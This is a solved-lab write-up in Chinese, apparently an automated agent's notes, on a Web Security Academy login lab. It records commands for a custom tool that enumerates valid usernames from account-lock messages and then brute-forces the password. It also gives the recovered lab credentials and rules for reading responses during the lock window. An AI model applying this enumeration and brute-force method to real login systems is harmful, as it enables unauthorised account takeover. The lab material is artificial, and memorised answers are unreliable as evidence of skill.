---
title: lab-username-enumeration-via-account-lock
status: solved
date: 2026-10-08
instance: https://0abe003a0335517180f8fde9005d00ef.web-security-academy.net/
pieces: acct_lock_enum
---

# Username enumeration via account lock(认证类)

- 臂 A 基线;range_launch(reused:false);判定 solved:banner_verdict solved:true + "Congratulations, you solved the lab!"。
- 新件 `acct_lock_enum` v1.3.0(`.pi-rs/rust-scripts/`):枚举腿 + 爆破腿 + 锁等待复验,一个信封。

## 关键步

1. page_read 取 widget-lab-id → range_launch --jar /tmp/cj1.json(实例 0abe003a…)。
2. http_session get 官方候选表(auth-lab-usernames / auth-lab-passwords)→ doc_read 转 md → 两份第 105 行即全部候选(100 用户名、100 口令)。
3. `acct_lock_enum <login-url> --users /tmp/lab-users.txt --attempts 5`:不存在名恒 "Invalid username or password";`vagrant` 第 4 次起 "too many incorrect login attempts" ⇒ 有效用户名。
4. `acct_lock_enum <login-url> --user vagrant --passwords /tmp/lab-passwords.txt`:第 26 条 `superman` 返回既非 lock 非 invalid ⇒ 命中口令。
5. 首次复验 /my-account 未登录(锁未过期);等 65s 重放同口令 → 302 `location=/my-account?id=vagrant` + 新 session → 账户页 "Your username is: vagrant"。
6. banner_verdict → solved:true。

## 证据摘录

- 枚举 `{"user":"vagrant","classes":["invalid","invalid","invalid","lock"],"statuses":[200,200,200,200]}`。
- 爆破 `class_histogram [invalid 3, lock 22, other 1]` + `hit {"password":"superman","class":"other","status":200}`。
- 锁定期内:错误口令 → 200 + lock 提示;正确口令 → 200 纯登录页(无提示,有时发一个**未认证**的 session)。
- 锁过期后:同口令 → 302 `location=/my-account?id=vagrant`,set_cookie session;`/my-account` 200 含 "Your username is: vagrant"。
- v1.3.0 末跑自证:`confirm {"authed":false}` → `confirm_fresh {"waited_secs":65,"login_status":302,"set_cookie_names":["session"],"account_status":200,"authed":true}`。

## 复用要点

- 锁定逻辑缺陷判读口径:lock 提示只对**存在**的账号出现(枚举腿);锁定期内错误口令恒 lock 提示、正确口令给出**无提示的登录页**(爆破腿)⇒ 不必等锁过期就能判定口令。
- 铁律:命中判据 = 既无 fail 提示也无 lock 提示;终判据 = `/my-account` 正文含 "Your username is:"。
- 坑:`/my-account` 未登录是 302→/login(跟随后面仍是 200),只看状态码会把未登录误判成成功。

## 未决面

- 锁定时长实测约 60s(等 65s 必过);是否随失败次数增长未测。
- 命中响应(锁内)不总带 Set-Cookie,v1.2.0 的"无 cookie 重放"腿在锁内仍不认证,锁等待腿(v1.3.0)才是收口路径。
